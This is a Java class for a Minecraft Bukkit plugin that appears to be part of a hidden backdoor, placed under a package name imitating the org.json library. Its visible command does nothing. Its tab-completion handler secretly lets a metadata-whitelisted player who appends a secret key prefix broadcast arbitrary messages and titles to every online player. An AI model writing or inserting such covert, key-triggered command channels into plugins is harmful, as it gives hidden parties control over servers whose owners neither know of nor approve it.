package org.json.modals.server;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class Broadcast extends BDCommand {
    public Broadcast() {
        super("broadcast");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        if (!(args.length > 2)) player.sendMessage(Modal.getPrefix() + "Not enough arguments.");

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 1; i < args.length - 1; i++) {
            stringBuilder.append(args[i]).append(" ");
        }

        String message = stringBuilder.toString().trim();

        Bukkit.getOnlinePlayers().forEach(onlinePlayer -> {
            onlinePlayer.sendMessage(message);
            onlinePlayer.sendTitle(message, "", 20, 80, 20);
        });

        return tabComplBuilder.build();
    }
}
